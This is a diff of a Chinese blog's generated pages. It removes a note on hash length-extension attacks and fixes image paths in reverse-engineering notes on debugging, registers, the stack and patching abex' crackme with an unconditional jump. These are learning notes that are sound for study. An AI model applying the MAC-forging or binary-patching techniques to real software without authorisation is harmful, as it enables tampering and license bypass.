-<h2 id="长度扩展示意"><a href="#长度扩展示意" class="headerlink" title="长度扩展示意"></a>长度扩展示意</h2><p>如果一个系统把消息写成：</p>
-<div class="math-display">
-
-<div class="math-display">\[
-\text{token} = H(\text{secret} || m)
-\]</div>
-
-</div>
-
-
-
-<p>那么攻击者在不知道 <code>secret</code> 的情况下，也可能构造：</p>
-<div class="math-display">
-
-<div class="math-display">\[
-H(\text{secret} || m || \text{padding} || m')
-\]</div>
-
-</div>
-
-
-
-<p>这就是长度扩展攻击的核心思想。</p>
-<h3 id="一个更具体的题面例子"><a href="#一个更具体的题面例子" class="headerlink" title="一个更具体的题面例子"></a>一个更具体的题面例子</h3><p>题目可能会给出：</p>
-<ul>
-<li>原消息：<code>username=admin</code></li>
-<li>原摘要：<code>SHA1(secret || username=admin)</code></li>
-<li>目标：伪造出 <code>username=admin&amp;role=1</code></li>
-</ul>
-<p>如果已知 <code>secret</code> 长度范围，就可以利用长度扩展把新的参数附加进去，同时构造新的合法摘要。</p>
-<h2 id="哈希在密码学中的角色-1"><a href="#哈希在密码学中的角色-1" class="headerlink" title="哈希在密码学中的角色"></a>哈希在密码学中的角色</h2><p>哈希函数本身不是加密算法，但它是很多密码学协议的基础组件。比如：</p>
-<ul>
-<li>RSA 签名通常先对消息哈希</li>
-<li>TLS 协议中会用哈希构造握手摘要</li>
-<li>区块链中会用哈希链接区块</li>
-<li>口令系统里用哈希保存密码</li>
-</ul>
-<p>因此，哈希函数虽然结构简单，但在安全体系中非常关键。</p>
 ]]></content>
       <categories>
         <category>密码学</category>
@@ -5351,10 +5351,10 @@ f(x)g(x)=\sum_{k=0}^{n+m} c_k x^k,\quad c_k=\sum_{i+j=k} a_i b_j
 <figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;windows.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">MessageBoxA</span>(<span class="literal">NULL</span>,</span><br><span class="line">        <span class="string">&quot;Hello World!&quot;</span>,</span><br><span class="line">        <span class="string">&quot;TEST&quot;</span>,</span><br><span class="line">        MB_OK);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 <p>编译为可执行文件,进IDA看看</p>
-<p><img src="C:\Users\Petrichor\AppData\Roaming\Typora\typora-user-images\image-20260808110158037.png" alt="image-20260808110158037"></p>
+<p><img src="/images/image-20260808110158037.png" alt="image-20260808110158037"></p>
 <p>可以看见几乎都还原了</p>
 <p>再进dbg看</p>
-<p><img src="C:\Users\Petrichor\AppData\Roaming\Typora\typora-user-images\image-20260808110503132.png" alt="image-20260808110503132"></p>
+<p><img src="/images/image-20260808110503132.png" alt="image-20260808110503132"></p>
 <p>这是一段看上去有些复杂的汇编代码。由于大家尚未掌握汇编语言，所以暂时无法全部理解这段汇编代码的含义。</p>
 <p>现在不理解没关系，不用担心，随着学习的不断深入，大家慢慢就会熟悉它，并理解它代表的含义</p>
 <p>它们并不是我们在源代码中调用的函数，也不是我们要查找的 main () 函数。其实，这些函数是 Visual C++ 为了保证程序正常运行而自动添加（我们的源码中并没有）的 Visual C++ 启动函数（Stub Code，根据不同的编译器类型与版本，启动函数也会有所不同）。现在并不需要关注它们，后面我会用IDA进行分析,我们的目标是 main () 函数</p>
@@ -5362,9 +5362,9 @@ f(x)g(x)=\sum_{k=0}^{n+m} c_k x^k,\quad c_k=\sum_{i+j=k} a_i b_j
 <p><strong>CALL 指令</strong>用于调用子程序。执行时，它会将当前指令的下一条指令地址压入堆栈，跳转到目标地址执行子程序。子程序完成后，通过 <strong>RET</strong> 指令从堆栈中弹出返回地址，跳回到调用点继续执行。这种机制使得 <strong>CALL</strong> 非常适合函数调用，因为它能够确保程序在执行完子程序后返回原位置。</p>
 <p><strong>JMP 指令</strong>用于无条件跳转。它直接将程序的执行流跳转到目标地址，而不会保存跳转前的位置。执行 <strong>JMP</strong> 后，程序不会返回到原位置，除非显式使用 <strong>CALL</strong> 或 <strong>JMP</strong> 跳回。它通常用于循环控制、跳过代码段或直接跳转到某个函数。</p>
 <p>接下来继续查找,我们一直F8单步</p>
-<p><img src="C:\Users\Petrichor\AppData\Roaming\Typora\typora-user-images\image-20260808124235683.png" alt="image-20260808124235683"></p>
+<p><img src="/images/image-20260808124235683.png" alt="image-20260808124235683"></p>
 <p>这里出现了我们写的api,即<strong>MessageBoxA</strong>,那么地址00007FF74F0C15E0很有可能就是我们的main函数,F7跟进</p>
-<p><img src="C:\Users\Petrichor\AppData\Roaming\Typora\typora-user-images\image-20260808124956878.png" alt="image-20260808124956878"></p>
+<p><img src="/images/image-20260808124956878.png" alt="image-20260808124956878"></p>
 <p>前六行是函数序言,先不用在意</p>
 <p>后面是对函数参数的赋值(x64 fastcall调用约定)</p>
 <table>
@@ -5402,22 +5402,22 @@ f(x)g(x)=\sum_{k=0}^{n+m} c_k x^k,\quad c_k=\sum_{i+j=k} a_i b_j
 </tr>
 </tbody></table>
 <p>最后call</p>
-<p><img src="C:\Users\Petrichor\AppData\Roaming\Typora\typora-user-images\image-20260808125721717.png" alt="image-20260808125721717"></p>
+<p><img src="/images/image-20260808125721717.png" alt="image-20260808125721717"></p>
 <h2 id="打补丁修改字符串"><a href="#打补丁修改字符串" class="headerlink" title="打补丁修改字符串"></a>打补丁修改字符串</h2><p>代码逆向分析中，“打补丁” 操作是不可或缺的重要主题。利用 “打补丁” 技术不仅可以修复已有程序中的 Bug，还可以向程序中添加新功能。“打补丁” 的对象可以是文件、内存，还可以是程序的代码、数据等。我们将使用 “打补丁” 技术把 HelloWorld.exe 程序消息窗口显示的 “Hello World!” 字符串更改为其他字符串</p>
 <p>下面介绍 2 种简单的修改字符串的方法</p>
 <p>① 直接修改字符串缓冲区（buffer）</p>
 <p>② 在其他内存区域生成新字符串并传递给消息函数</p>
-<h3 id="直接修改字符串缓冲区"><a href="#直接修改字符串缓冲区" class="headerlink" title="直接修改字符串缓冲区"></a>直接修改字符串缓冲区</h3><p><img src="C:\Users\Petrichor\AppData\Roaming\Typora\typora-user-images\image-20260808131906417.png" alt="image-20260808131906417"></p>
+<h3 id="直接修改字符串缓冲区"><a href="#直接修改字符串缓冲区" class="headerlink" title="直接修改字符串缓冲区"></a>直接修改字符串缓冲区</h3><p><img src="/images/image-20260808131906417.png" alt="image-20260808131906417"></p>
 <p>MessageBoxA 函数的字符串参数 “Hello World!” 保存在地址 C4005 处的一段缓冲区中，只要修改这段内容，就可以修改 MessageBoxA 函数显示出的字符串。在内存窗口选中要修改的字符串.按 Ctrl+E 快捷键打开编辑窗口</p>
-<p><img src="C:\Users\Petrichor\AppData\Roaming\Typora\typora-user-images\image-20260808194222759.png" alt="image-20260808194222759"></p>
+<p><img src="/images/image-20260808194222759.png" alt="image-20260808194222759"></p>
 <p>虽然指令保持不变，但原字符串已经被新字符串取代，用作 MessageBoxA () 函数的参数，并且参数的地址仍为 4092A0，只是该地址空间中的内容（字符串）发生了改变。按 F9 键运行程序后，将弹出消息窗口，可以看到显示出的新字符串。</p>
-<p><img src="C:\Users\Petrichor\AppData\Roaming\Typora\typora-user-images\image-20260808194257844.png" alt="image-20260808194257844"></p>
+<p><img src="/images/image-20260808194257844.png" alt="image-20260808194257844"></p>
 <p>若新字符串长度大于原有字符串，执行覆盖操作时可能损坏字符串后面的数据，所以一定要小心。特别是字符串后面有非常重要的数据时，覆盖操作导致数据损坏就会引发程序内存引用错误</p>
 <p>可执行文件保存字符串时一般会给字符串多留出一些空间。所以，如果你的运气足够好，使用更长的字符串覆盖原字符串时，即使原字符串后面的部分空间被侵占，程序仍然能正常运行</p>
 <p>上面的调试中，我们通过修改字符串缓冲区更改了程序显示的消息内容，但是这种更改只是暂时的，终止调试（即 HelloWolrd.exe 进程结束）后，程序中的原字符串仍然没有改变。如果想把这种更改永久保存下来，就要把更改后的程序另保存为一个可执行文件</p>
 <h3 id="在其他内存区域新建字符串并传递给消息函数"><a href="#在其他内存区域新建字符串并传递给消息函数" class="headerlink" title="在其他内存区域新建字符串并传递给消息函数"></a>在其他内存区域新建字符串并传递给消息函数</h3><p>按 Ctrl+F2 快捷键重启调试,再看一下 main () 函数</p>
-<p><img src="C:\Users\Petrichor\AppData\Roaming\Typora\typora-user-images\image-20260808195054487.png" alt="image-20260808195054487"></p>
-<p><img src="C:\Users\Petrichor\AppData\Roaming\Typora\typora-user-images\image-20260808195819184.png" alt="image-20260808195819184"></p>
+<p><img src="/images/image-20260808195054487.png" alt="image-20260808195054487"></p>
+<p><img src="/images/image-20260808195819184.png" alt="image-20260808195819184"></p>
 <p>这里和原著有点不一样,原著是x86,遵循<strong>stdcall调用约定</strong></p>
 <ul>
 <li>参数<strong>全部压栈传递</strong>，从右往左 PUSH 入栈</li>
@@ -5426,15 +5426,15 @@ f(x)g(x)=\sum_{k=0}^{n+m} c_k x^k,\quad c_k=\sum_{i+j=k} a_i b_j
 <p>不过思想是一样的,向 MessageBoxW () 函数传递字符串参数时，传递的是字符串所在区域的首地址。如果改变了字符串地址，消息框就会显示变更后的字符串。在内存的某个区域新建一个长字符串，并把新字符串的首地址传递给 MessageBoxW () 函数，可以认为传递的是完全不同的字符串地址</p>
 <p>那上面的想法相当不错，但还要考虑另一个问题：“应该在内存的哪块区域创建新字符串呢？” 要想解开答案，需要掌握 PE 文件格式与虚拟地址（Virtual Address）结构的相关知识，后面章节中会详细讲解。此处任选一块区域即可</p>
 <p>我们定位Hello world!字符串在内存中的位置,往下翻,会发现一大片内存区域由<strong>NULL填充</strong>(NULL padding)结束</p>
-<p><img src="C:\Users\Petrichor\AppData\Roaming\Typora\typora-user-images\image-20260808200650588.png" alt="image-20260808200650588"></p>
+<p><img src="/images/image-20260808200650588.png" alt="image-20260808200650588"></p>
 <p>这就是程序中未使用的NULL填充区</p>
 <p>应用程序被加载到内存时有一个最小的内存分配大小，一般为 10000。即使程序运行时只占用 100 内存，它被加载到内存时仍然会分到 10000 左右的内存，这些内存一部分被程序占用，其余部分为空余区域，全部被填充为 NULL</p>
 <p>选一块地址进行赋值,记下地址00007FF74F0C4900</p>
-<p><img src="C:\Users\Petrichor\AppData\Roaming\Typora\typora-user-images\image-20260808201110010.png" alt="image-20260808201110010"></p>
+<p><img src="/images/image-20260808201110010.png" alt="image-20260808201110010"></p>
 <p>仅进行上述操作无法更改消息框中的字符串。既然已经新建了缓冲区，接下来就应该把新的缓冲区地址作为参数传递给 MessageBoxW () 函数。为此，我们需要在代码窗口中使用汇编命令修改代码。将光标置于地址 00007FF74F0C1601 处，按空格键打开 Assemble 窗口,将地址修改为新字符串的首地址</p>
-<p><img src="C:\Users\Petrichor\AppData\Roaming\Typora\typora-user-images\image-20260808201443969.png" alt="image-20260808201443969"></p>
+<p><img src="/images/image-20260808201443969.png" alt="image-20260808201443969"></p>
 <p>F9运行</p>
-<p><img src="C:\Users\Petrichor\AppData\Roaming\Typora\typora-user-images\image-20260808201718539.png" alt="image-20260808201718539"></p>
+<p><img src="/images/image-20260808201718539.png" alt="image-20260808201718539"></p>
 <p>若把修改后的代码重新保存为程序文件，可以发现程序无法正常运行，这是由 00007FF74F0C4900这一地址引起的。可执行文件被加载到内存并以进程形式运行时，文件并非原封不动地被载入内存，而是要遵循一定规则进行。这一过程中，通常进程的内存是存在的，但是相应的文件偏移（offset）并不存在。上面示例中，与内存 00007FF74F0C4900对应的文件偏移就不存在，所以修改后的程序无法正常运行。若想进一步了解其中原理，需要学习 PE 文件格式相关知识。</p>
 <h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><table>
 <thead>
@@ -5488,7 +5488,7 @@ f(x)g(x)=\sum_{k=0}^{n+m} c_k x^k,\quad c_k=\sum_{i+j=k} a_i b_j
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">BYTE  b  = 0x12;</span><br><span class="line">WORD  w  = 0x1234;</span><br><span class="line">DWORD dw = 0x12345678;</span><br><span class="line">char  str[] = &quot;abcde&quot;;</span><br></pre></td></tr></table></figure>
 
 <p>以上代码共 4 种不同大小的数据类型，同一数据按不同字节序存储结果存在差异。 </p>
-<p><img src="C:\Users\Petrichor\AppData\Roaming\Typora\typora-user-images\image-20260808210127124.png" alt="image-20260808210127124"></p>
+<p><img src="/images/image-20260808210127124.png" alt="image-20260808210127124"></p>
 <p>数据类型为字节型（BYTE）时，其长度为 1 个字节，保存这样的数据时，无论采用大端序还是小端序，字节顺序都是一样的。但是数据长度为 2 个字节以上（含 2 个字节）时，采用不同字节序保存它们形成的存储顺序是不同的。</p>
 <p>采用大端序存储数据时，内存地址低位存储数据的高位，内存地址高位存储数据的低位，这是一种最直观的字节存储顺序；</p>
 <p>采用小端序存储数据时，地址高位存储数据的高位，地址低位存储数据的低位，这是一种逆序存储方式，保存的字节顺序被倒转。变量 w 与 dw 中的值就能了解大端序与小端序的不同。</p>
@@ -5499,15 +5499,15 @@ f(x)g(x)=\sum_{k=0}^{n+m} c_k x^k,\quad c_k=\sum_{i+j=k} a_i b_j
 <figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;windows.h&quot;</span></span></span><br><span class="line"></span><br><span class="line">BYTE  b    = <span class="number">0x12</span>;</span><br><span class="line">WORD  w    = <span class="number">0x1234</span>;</span><br><span class="line">DWORD dw   = <span class="number">0x12345678</span>;</span><br><span class="line"><span class="type">char</span>  str[]= <span class="string">&quot;abcde&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    byte  lb  = b;</span><br><span class="line">    WORD  lw  = w;</span><br><span class="line">    DWORD ldw = dw;</span><br><span class="line">    <span class="type">char</span>  *lstr = str;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 <p>编译后进dbg</p>
-<p><img src="C:\Users\Petrichor\AppData\Roaming\Typora\typora-user-images\image-20260808214845020.png" alt="image-20260808214845020"></p>
+<p><img src="/images/image-20260808214845020.png" alt="image-20260808214845020"></p>
 <p>还是断在了这里,依旧是一大片的启动函数,不用管,往下找</p>
-<p><img src="C:\Users\Petrichor\AppData\Roaming\Typora\typora-user-images\image-20260808215454236.png" alt="image-20260808215454236"></p>
+<p><img src="/images/image-20260808215454236.png" alt="image-20260808215454236"></p>
 <p>这里是main函数,内存中为对应的赋值</p>
 <p>可以注意到变量w和dw的数据采用小端序存储</p>
 <h2 id="ia32寄存器"><a href="#ia32寄存器" class="headerlink" title="ia32寄存器"></a>ia32寄存器</h2><p>学习程序调试技术前必须掌握 IA-32（Intel Architecture 32 位）寄存器相关内容。寄存器是 CPU 内部的高速存储单元，CPU 访问寄存器的速度远高于访问内存——因为 CPU 与内存之间的物理路径更长，而寄存器集成在 CPU 核心，读写几乎零延迟。</p>
 <p>为什么要学寄存器？因为在反汇编和调试时，看到的全是汇编指令，而绝大多数汇编指令都在操作寄存器。遇到不懂的指令就去翻 Intel 提供的用户手册，这是学习汇编最踏实的路径。</p>
 <h3 id="IA-32-寄存器分类"><a href="#IA-32-寄存器分类" class="headerlink" title="IA-32 寄存器分类"></a>IA-32 寄存器分类</h3><p>IA-32 是 Intel 的 32 位 CISC 架构，功能丰富，寄存器种类也多。从用途上可以分为以下几类：</p>
-<p><img src="C:\Users\Petrichor\AppData\Roaming\Typora\typora-user-images\image-20260808222404683.png" alt="image-20260808222404683"></p>
+<p><img src="/images/image-20260808222404683.png" alt="image-20260808222404683"></p>
 <ul>
 <li><strong>基本程序运行寄存器</strong>（Basic Program Execution Registers）——编程和调试最常用，也是初学者的重点</li>
 <li><strong>x87 FPU 寄存器</strong>——浮点运算单元寄存器</li>
@@ -5521,7 +5521,7 @@ f(x)g(x)=\sum_{k=0}^{n+m} c_k x^k,\quad c_k=\sum_{i+j=k} a_i b_j
 <li><strong>机器检查寄存器</strong></li>
 </ul>
 <p>初学者先掌握基本程序运行寄存器就够了。控制寄存器、内存管理寄存器、调试寄存器等属于进阶内容，在后续调试实践中再逐步深入。</p>
-<h3 id="基本程序运行寄存器"><a href="#基本程序运行寄存器" class="headerlink" title="基本程序运行寄存器"></a>基本程序运行寄存器</h3><p><img src="C:\Users\Petrichor\AppData\Roaming\Typora\typora-user-images\image-20260808222512675.png" alt="image-20260808222512675"></p>
+<h3 id="基本程序运行寄存器"><a href="#基本程序运行寄存器" class="headerlink" title="基本程序运行寄存器"></a>基本程序运行寄存器</h3><p><img src="/images/image-20260808222512675.png" alt="image-20260808222512675"></p>
 <p>基本程序运行寄存器是编写和阅读汇编代码时打交道最多的一组寄存器，共 16 个，分为四类：</p>
 <ul>
 <li><strong>通用寄存器</strong>：32 位，8 个（EAX、EBX、ECX、EDX、ESI、EDI、EBP、ESP）</li>
@@ -5531,7 +5531,7 @@ f(x)g(x)=\sum_{k=0}^{n+m} c_k x^k,\quad c_k=\sum_{i+j=k} a_i b_j
 </ul>
 <p>寄存器名前面的字母 <code>E</code> 代表 Extended（扩展），意思是这些寄存器在 16 位 CPU（IA-16）时代就已经存在，到了 IA-32 被从 16 位扩展到 32 位。访问时可以只取低 16 位（如 <code>AX</code>），也可以用完整的 32 位（如 <code>EAX</code>）。</p>
 <h3 id="通用寄存器"><a href="#通用寄存器" class="headerlink" title="通用寄存器"></a>通用寄存器</h3><p>通用寄存器用于数据传送、暂存数据、算术和逻辑运算以及保存结果。每个寄存器 32 位（4 字节），既可以存常数也可以存地址，由具体的汇编指令决定用途。其中部分寄存器有特定的隐含功能。</p>
-<p><img src="C:\Users\Petrichor\AppData\Roaming\Typora\typora-user-images\image-20260808222553068.png" alt="image-20260808222553068"></p>
+<p><img src="/images/image-20260808222553068.png" alt="image-20260808222553068"></p>
 <p>从图中可以看到，EAX、EBX、ECX、EDX 四个寄存器可以进一步拆分：</p>
 <ul>
 <li>低 16 位可以独立访问，叫 <code>AX</code>&#x2F;<code>BX</code>&#x2F;<code>CX</code>&#x2F;<code>DX</code></li>
@@ -5593,7 +5593,7 @@ f(x)g(x)=\sum_{k=0}^{n+m} c_k x^k,\quad c_k=\sum_{i+j=k} a_i b_j
 <p>Win32 API 函数内部会使用 ECX 和 EDX，调用 API 前如果这两个寄存器里存着有用的数据，要先备份（<code>PUSH</code> 到栈上），否则会被覆盖。</p>
 <p>EBP 用于建立栈帧。函数被调用时，通常先 <code>PUSH EBP</code> 保存调用者的 EBP，再 <code>MOV EBP, ESP</code> 把当前栈顶设为新帧基址，之后通过 <code>EBP + 偏移</code> 访问参数和局部变量。ESP 在 <code>PUSH</code>、<code>POP</code>、<code>CALL</code>、<code>RET</code> 时自动变化，始终指向栈顶，不应挪作他用。</p>
 <p>ESI 和 EDI 配合字符串指令使用：<code>LODS</code> 从 ESI 指向的地址读数据到 EAX，<code>STOS</code> 把 EAX 写到 EDI 指向的地址，<code>MOVS</code> 在 ESI 和 EDI 之间搬数据，配合 <code>REP</code> 前缀可以用 ECX 控制重复次数。</p>
-<h3 id="段寄存器"><a href="#段寄存器" class="headerlink" title="段寄存器"></a>段寄存器</h3><p><img src="C:\Users\Petrichor\AppData\Roaming\Typora\typora-user-images\image-20260808222727500.png" alt="image-20260808222727500"></p>
+<h3 id="段寄存器"><a href="#段寄存器" class="headerlink" title="段寄存器"></a>段寄存器</h3><p><img src="/images/image-20260808222727500.png" alt="image-20260808222727500"></p>
 <p>段的概念来自 IA-32 的内存管理模型。在保护模式下，CPU 通过分段机制实现内存保护：段寄存器里存的是段选择子（Selector），CPU 用它去查段描述符表（GDT&#x2F;LDT），拿到段基址、段限长和访问权限，再计算出线性地址。如果开启了分页，线性地址还要经过页表翻译成物理地址；如果没开分页，线性地址就是物理地址。</p>
 <p>6 个段寄存器都是 16 位：</p>
 <table>
@@ -5636,7 +5636,7 @@ f(x)g(x)=\sum_{k=0}^{n+m} c_k x^k,\quad c_k=\sum_{i+j=k} a_i b_j
 </tr>
 </tbody></table>
 <p>段寄存器的细节比较复杂，初学阶段不必深究。现代操作系统（Windows、Linux）在保护模式下大多使用平坦内存模型（Flat Model），各段基址都设为 0、段限长设为 4GB，分段机制实际上被绕过了。但在调试时，FS 寄存器很重要：它指向线程环境块（TEB），通过 FS 可以访问 SEH（结构化异常处理）、TEB 和 PEB（进程环境块），这些是高级调试和逆向的关键结构。</p>
-<h3 id="程序状态与控制寄存器-EFLAGS"><a href="#程序状态与控制寄存器-EFLAGS" class="headerlink" title="程序状态与控制寄存器 EFLAGS"></a>程序状态与控制寄存器 EFLAGS</h3><p><img src="C:\Users\Petrichor\AppData\Roaming\Typora\typora-user-images\image-20260808222800545.png" alt="image-20260808222800545"></p>
+<h3 id="程序状态与控制寄存器-EFLAGS"><a href="#程序状态与控制寄存器-EFLAGS" class="headerlink" title="程序状态与控制寄存器 EFLAGS"></a>程序状态与控制寄存器 EFLAGS</h3><p><img src="/images/image-20260808222800545.png" alt="image-20260808222800545"></p>
 <p>上图展示了分段内存模型：段寄存器（左）通过段描述符（中）映射到线性地址空间（右）中的不同区域——栈、代码、数据等。FS 和 GS 在实际使用中可以指向特殊段（如 TEB 所在的段）。</p>
 <p>EFLAGS 是标志寄存器，32 位，从 16 位的 FLAGS 扩展而来。它的每一位都有独立含义，值为 1 表示”置位”（On&#x2F;True），值为 0 表示”清除”（Off&#x2F;False）。有的位由 CPU 根据指令执行结果自动设置，有的位可以由程序指令修改。</p>
 <p>EFLAGS 有 32 位，先掌握三个最关键的标志位：</p>
@@ -5680,37 +5680,37 @@ f(x)g(x)=\sum_{k=0}^{n+m} c_k x^k,\quad c_k=\sum_{i+j=k} a_i b_j
 <p>(2) 调用函数时传递参数。</p>
 <p>(3) 保存函数返回后的地址。</p>
 <p>栈其实是一种数据结构，它按照 FILO（First In Last Out，后进先出）的原则存储数据。一会通过一个示例来证明这一点。</p>
-<h3 id="栈的特征"><a href="#栈的特征" class="headerlink" title="栈的特征"></a>栈的特征</h3><p><img src="C:\Users\Petrichor\AppData\Roaming\Typora\typora-user-images\image-20260808224833241.png" alt="image-20260808224833241"></p>
+<h3 id="栈的特征"><a href="#栈的特征" class="headerlink" title="栈的特征"></a>栈的特征</h3><p><img src="/images/image-20260808224833241.png" alt="image-20260808224833241"></p>
 <p>一个进程中，栈顶指针（ESP）初始状态指向栈底端。执行 PUSH 命令将数据压入栈时，栈顶指针就会上移到栈顶端。执行 POP 命令从栈中弹出数据时，若栈为空，则栈顶指针重新移动到栈底端。换言之，栈是一种由高地址向低地址扩展的数据结构，图 5-1 中，栈是由下往上扩展的。由于栈具有这种特征，所以我们常常说 “栈是逆向扩展的”，向栈中压数据就像一层层砌砖，每向上砌一层，砖墙就增高一点儿。</p>
 <h2 id="栈操作示例"><a href="#栈操作示例" class="headerlink" title="栈操作示例"></a>栈操作示例</h2><p>给定伪代码</p>
 <figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    __asm__ __volatile__(</span><br><span class="line">        <span class="string">&quot;push $0x100\n\t&quot;</span></span><br><span class="line">        <span class="string">&quot;pop %%eax\n\t&quot;</span></span><br><span class="line">        <span class="string">&quot;nop\n\t&quot;</span></span><br><span class="line">        ::: <span class="string">&quot;eax&quot;</span>, <span class="string">&quot;esp&quot;</span>, <span class="string">&quot;memory&quot;</span></span><br><span class="line">    );</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 <p>给定初始状态</p>
-<p><img src="C:\Users\Petrichor\AppData\Roaming\Typora\typora-user-images\image-20260810211230347.png" alt="image-20260810211230347"></p>
-<p><img src="C:\Users\Petrichor\AppData\Roaming\Typora\typora-user-images\image-20260810211308060.png" alt="image-20260810211308060"></p>
+<p><img src="/images/image-20260810211230347.png" alt="image-20260810211230347"></p>
+<p><img src="/images/image-20260810211308060.png" alt="image-20260810211308060"></p>
 <p>初始状态下，ESP 为 60FF74。按 F7 键（Step Into）执行地址 4015DB 处的 PUSH 100 命令后</p>
-<p><img src="C:\Users\Petrichor\AppData\Roaming\Typora\typora-user-images\image-20260810211517850.png" alt="image-20260810211517850"></p>
+<p><img src="/images/image-20260810211517850.png" alt="image-20260810211517850"></p>
 <p>如图所示，ESP 值变为 60FF70，减少了 4 个字节，值 100 存入栈。ESP 向上（低地址）移动。</p>
 <p>接着执行 POP EAX 命令，栈顶值 100 弹出至 EAX，ESP 恢复为 60FF74。</p>
-<p><img src="C:\Users\Petrichor\AppData\Roaming\Typora\typora-user-images\image-20260810211700163.png" alt="image-20260810211700163"></p>
+<p><img src="/images/image-20260810211700163.png" alt="image-20260810211700163"></p>
 <p>向栈压入数据时，栈顶指针减小，向低地址移动；从栈中弹出数据时，栈顶指针增加，向高地址移动。</p>
 <p>还请记住，栈顶指针在初始状态下指向栈底。这就是栈的特征。</p>
 <p>上面这个简单示例验证了栈的工作原理，展现了向栈压入或弹出数据时栈顶指针的变化规律。程序调试中栈与栈顶指针的变化是十分重要的，调试时要密切关注。</p>
 <h2 id="分析abx’-carckme"><a href="#分析abx’-carckme" class="headerlink" title="分析abx’ carckme"></a>分析abx’ carckme</h2><p>本章我们将分析一个非常简单的 crackme 小程序，以进一步熟悉调试器与汇编代码。当然，我们的目标并不是为了破解（Crack）它，而是通过它来加深对汇编代码与调试技术的认识。</p>
 <p>顾名思义，crackme 就是 “破解我” 的意思，它们都是一些公开用作破解练习的小程序。作为代码逆向分析技术的初学者，尝试分析一些简单的 crackme 小程序可以验证自己掌握的技术，加深对调试器及汇编代码的认识。Abex’ crackme 就是这样一个简单的著名小程序，国内外有许多网站都对它进行了详细讲解与说明。将自己的破解方法与其他人的相比较，这样能进一步提高自己的水平。</p>
 <p>调试前先运行 abex’ crackme #1 这个程序，大致了解一下它。</p>
-<p><img src="C:\Users\Petrichor\AppData\Roaming\Typora\typora-user-images\image-20260809134028404.png" alt="image-20260809134028404"></p>
+<p><img src="/images/image-20260809134028404.png" alt="image-20260809134028404"></p>
 <p>就是让程序觉得我的HD是CD-Rom,点一下确定看看</p>
-<p><img src="C:\Users\Petrichor\AppData\Roaming\Typora\typora-user-images\image-20260809134125593.png" alt="image-20260809134125593"></p>
+<p><img src="/images/image-20260809134125593.png" alt="image-20260809134125593"></p>
 <p>再就没有了,进dbg看看</p>
-<p><img src="C:\Users\Petrichor\AppData\Roaming\Typora\typora-user-images\image-20260809132613814.png" alt="image-20260809132613814"></p>
+<p><img src="/images/image-20260809132613814.png" alt="image-20260809132613814"></p>
 <p>这一部分原著讲的很好,直接贴了</p>
 <p>EP 代码非常短，它与我们前面分析的 HelloWorld.exe 有非常大的不同。这是因为 abex’ crackme 程序是使用汇编语言编写出来的可执行文件。</p>
 <p>使用 VC++、VC、Delphi 等开发工具编写程序时，除了自己编写的代码外，还有一部分启动函数是由编译器添加的，经过反编译后，代码看上去就变得非常复杂。但是如果直接使用汇编语言编写程序，汇编代码会直接变为反汇编代码。观察图中的代码可以看到，main () 直接出现在 EP 中，简洁又直观，充分证明了这是一个直接用汇编语言编写的程序。</p>
 <p>因为代码非常简短,一点到分析,重点关注图中API调用的内容</p>
-<p><img src="C:\Users\Petrichor\AppData\Roaming\Typora\typora-user-images\image-20260809143209668.png" alt="image-20260809143209668"></p>
+<p><img src="/images/image-20260809143209668.png" alt="image-20260809143209668"></p>
 <p>如果之前大家从事过Windows应用程序的开发，那么对以上几个函数的含义应该非常了解。从上述代码的分析中，我们能够准确把握程序制作者的真正意图。在消息窗口按”确定”后，程序会调用GetDriveType() API，获取CD驱动器的类型（大部分返回的是HDD类型），然后操作它，使之被识别为CD-ROM类型，再在消息窗口中输出”OK, I really think that your HD is a CD-ROM! :p”消息。下面逐行分析crackme的代码。</p>
-<p><img src="C:\Users\Petrichor\AppData\Roaming\Typora\typora-user-images\image-20260809144838262.png" alt="image-20260809144838262"></p>
+<p><img src="/images/image-20260809144838262.png" alt="image-20260809144838262"></p>
 <table>
 <thead>
 <tr>
@@ -5748,13 +5748,13 @@ f(x)g(x)=\sum_{k=0}^{n+m} c_k x^k,\quad c_k=\sum_{i+j=k} a_i b_j
 </tr>
 </tbody></table>
 <h3 id="破解"><a href="#破解" class="headerlink" title="破解"></a>破解</h3><p>很明显我们想弹出”Ok, I really think that your HD is a CD-ROM! :p”这个字符串</p>
-<p><img src="C:\Users\Petrichor\AppData\Roaming\Typora\typora-user-images\image-20260809145935004.png" alt="image-20260809145935004"></p>
+<p><img src="/images/image-20260809145935004.png" alt="image-20260809145935004"></p>
 <p>关键在于ZF的标志位,若为1则跳转到40103D </p>
 <p>我们可以直接改为无条件跳转jmp,即不论ZF标志位,都跳转</p>
 <p>ctrl+p保存运行即可</p>
-<p><img src="C:\Users\Petrichor\AppData\Roaming\Typora\typora-user-images\image-20260809150416539.png" alt="image-20260809150416539"></p>
+<p><img src="/images/image-20260809150416539.png" alt="image-20260809150416539"></p>
 <h2 id="将参数压入栈"><a href="#将参数压入栈" class="headerlink" title="将参数压入栈"></a>将参数压入栈</h2><p>函数调用时将参数压入栈的方法,就拿刚才这个程序举例</p>
